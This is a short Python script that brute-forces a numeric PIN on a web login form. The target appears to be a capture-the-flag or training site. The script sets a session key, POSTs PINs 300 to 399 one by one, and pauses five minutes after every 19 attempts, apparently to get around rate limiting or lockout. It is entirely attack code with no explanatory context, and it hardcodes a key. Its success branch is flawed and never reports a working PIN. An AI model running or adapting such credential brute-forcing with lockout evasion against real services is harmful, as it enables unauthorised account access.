#!/usr/bin/python3

import requests
import re
import time

key = "6StVknGQcaqqZwjJw3q4m9ypm9cGbqf2!cYV9Vjs"
url = "http://104.cybertrial.co.uk/login"
r = requests.session()
counter = 0
min = 300
max = 400
sleep_time = 300

#Set Session API Key
response = r.get("http://104.cybertrial.co.uk/?mykey=" + key)
#print("API Key Get Request Response Code: " + str(response.status_code))
#200-400

#for curPin in range(0, 1000):
for i in range(min, max, 1):
    payload = {"formgo": "1", "pin": str(i)}
    print("Trying pin: " + payload["pin"])

    response = r.post(url, data=payload)

    check = re.search("Your pin is incorrect", response.text)

    with open("pin", 'w') as f:
        f.write(payload["pin"])
    
    if(counter < 19):
        if(check == None):
            print(response.text)
        elif(check[0]!="Your pin is incorrect"):
            print(response.text)
            print("Working pin: " + payload["pin"])
            break
        counter = counter + 1
    else:
        time.sleep(sleep_time)
        counter=0
